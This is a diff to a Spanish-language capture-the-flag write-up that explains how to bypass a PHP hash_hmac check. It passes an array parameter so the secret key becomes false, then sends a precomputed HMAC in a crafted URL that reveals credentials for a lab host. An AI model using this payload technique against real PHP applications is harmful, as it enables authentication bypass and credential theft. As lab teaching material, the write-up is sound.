@@ -144,8 +144,6 @@ Enlace funcion hash_mac --> https://www.php.net/manual/es/function.hash-hmac.php
 
 ## Explotando/Bypass funcion hash_mac PHP
 
-Enlace Bypass--> https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up/
-
 Fichero hmac.php, lo esplicaremos por secciones.
 
 	<?php
@@ -175,12 +173,62 @@ Fichero hmac.php, lo esplicaremos por secciones.
 		}
 	?>
 
- (1) if ---> comprueba si las variables h o host estan vacias, por lo que son necesarias en nuestra url si  queremos saltar el primer if.
+ (1) if --> comprueba si las variables h o host estan vacias, por lo que son necesarias en nuestra url si  queremos saltar el primer if.
  	Si enviamos las variables vacias entraremos en el if como nos muestra el ejemplo.
  
  	http://pwd.harder.local/index.php?h=''&host=''
   
-  ![Uploading image.png…]()
+![image](https://github.com/Esevka/CTF/assets/139042999/ab0be6a5-dc8b-453f-8f92-f0b722ce1f49)
 
+(2) if --> comprueba que existe la variable n, para almacenar el resultado de la funcion hash_mac en la variable $secrets, que posteriormente sera utilizada en el (3)if como key de la funcion hash_mac, por lo que nuestra url debe tener la variable n tambien.
+
+	http://pwd.harder.local/index.php?h=''&host=''&n=''
+
+Estructura funcion hash_mac ---> hash_hmac(algoritmo,data,key)
+
+	algoritmo	-> algoritmo para cifrar.
+	data		-> Mensaje para cifrar.
+	key 		-> Clave secreta compartida que se usará para generar el mensaje cifrado.
 
 			
+(3) if --> comprueba que tanto la variable $hm(resultado de la funciona hash_mac donde utiliza domo data la variable host y como key la variable $secret resultado de la funciona hach_mac del (2) if),como la varialbe h que pasamos por la url sean iguales tanto en tipo como en valor.
+
+Explicacion del bypass.
+
+ -En la funciona hash_mac la data que espera debe ser string, pero si le pasamos en vez de un string un array de datos esta funcion se rompe devolviendo como resultado ===false===, por lo que nuestra 	variable $secret=false, controlando esta variable que es la key  y la variable host que la introducimos nosotros podremos bypasear la funciona
+
+	 $hm = hash_hmac('sha256', $_GET['host'], $secret);
+		
+		if ($hm !== $_GET['h'])
+			
+
+Info Bypass--> https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up/
+
+Preparamos nuestra carga
+
+	Valor que que introduciremos en la variable h
+
+		<?php
+			echo hash_hmac('sha256','esevka',false);
+		?>
+
+		h=c36f9d28c5f2b9f77d47e6862f1b8af43a50ae3c0b2a20c235032bf4b03bf2c9
+
+Url modificada para bypasear la funcion
+
+		http://pwd.harder.local/index.php?h=c36f9d28c5f2b9f77d47e6862f1b8af43a50ae3c0b2a20c235032bf4b03bf2c9&host=esevka&n[]=
+
+Al ejecutar la url, la web nos devulve un resultado muy interesante.
+
+	url 				username 	password (cleartext)
+	http://shell.harder.local 	evs 		9FRe8VUuh----Wn0e9RfSGv7xm
+
+## Nuevo dominio encontrado.
+
+Anadimos dicho dominio encontrado a nuestro fichero /etc/hosts.
+
+	┌──(root㉿kali)-[/home/kali/Desktop/ctf/harder]
+	└─# cat /etc/hosts                                                  
+	10.10.29.10     pwd.harder.local shell.harder.local
+
+	
